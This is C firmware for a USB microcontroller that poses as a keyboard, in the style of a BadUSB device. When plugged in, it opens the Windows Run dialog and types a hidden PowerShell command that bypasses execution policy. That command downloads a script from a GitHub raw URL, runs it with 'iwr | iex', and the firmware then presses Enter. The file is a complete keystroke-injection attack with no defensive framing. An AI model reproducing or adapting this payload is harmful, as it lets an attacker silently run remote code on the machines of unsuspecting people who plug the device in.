#include "src/system.h"
#include "src/delay.h"
#include "src/usb_keyboard.h"

// Prototypes for used interrupts
void USB_interrupt(void);
void USB_ISR(void) __interrupt(INT_NO_USB) {
  USB_interrupt();
}

void main(void) {
  CLK_config();
  DLY_ms(10);
  KBD_init();

  DLY_ms(200);

  KBD_press(KBD_KEY_LEFT_GUI);  // Press Windows key
  KBD_press('r');               // Press R key
  DLY_ms(80);
  KBD_release('r');             // Release R key
  KBD_release(KBD_KEY_LEFT_GUI);// Release Windows key
  
  DLY_ms(200);

  KBD_print("powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"iwr https://raw.githubusercontent.com/vjfq/q/refs/heads/main/hi | iex\""
);
  
  DLY_ms(50);
  KBD_type(KBD_KEY_RETURN);

  while(1) {
    DLY_ms(1000);
  }
}
